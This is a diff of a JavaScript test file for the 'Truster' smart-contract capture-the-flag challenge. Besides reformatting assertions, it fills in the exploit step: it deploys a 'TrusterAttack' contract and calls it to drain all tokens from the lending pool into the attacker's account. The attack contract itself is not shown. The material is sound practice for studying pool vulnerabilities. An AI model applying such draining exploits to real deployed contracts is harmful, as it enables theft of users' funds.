@@ -18,29 +18,27 @@ describe('[Challenge] Truster', function () {
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+        expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
+        expect(await this.token.balanceOf(attacker.address)).to.equal('0');
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const AttackContractFactory = await ethers.getContractFactory('TrusterAttack', attacker);
+        this.attackContract = await AttackContractFactory.connect(attacker).deploy(
+            this.token.address,
+            this.pool.address
+        );
+
+        await this.attackContract.connect(attacker).attack(TOKENS_IN_POOL);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
 
         // Attacker has taken all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
+        expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
+        expect(await this.token.balanceOf(this.pool.address)).to.equal('0');
     });
 });
-
